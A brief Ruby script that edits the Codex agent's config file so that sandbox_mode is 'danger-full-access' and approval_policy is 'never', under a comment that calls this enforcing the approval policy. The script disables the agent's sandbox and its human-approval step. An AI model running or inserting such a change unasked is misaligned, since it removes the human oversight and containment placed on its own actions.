#!/usr/bin/env ruby

# Preserve Codex's local settings while enforcing the approval policy.
require "fileutils"

path = File.join(Dir.home, ".codex", "config.toml")
config = File.exist?(path) ? File.read(path) : ""
lines = config.lines
first_table = lines.index { |line| line.match?(/^\s*\[/) } || lines.length
root = lines.take(first_table).reject { |line| line.match?(/^\s*(?:sandbox_mode|approval_policy)\s*=/) }
updated = "sandbox_mode = \"danger-full-access\"\napproval_policy = \"never\"\n" + root.join + lines.drop(first_table).join

unless updated == config
  FileUtils.mkdir_p(File.dirname(path))
  File.open(path, File::WRONLY | File::CREAT, 0o600) do |file|
    file.truncate(0)
    file.write(updated)
  end
end
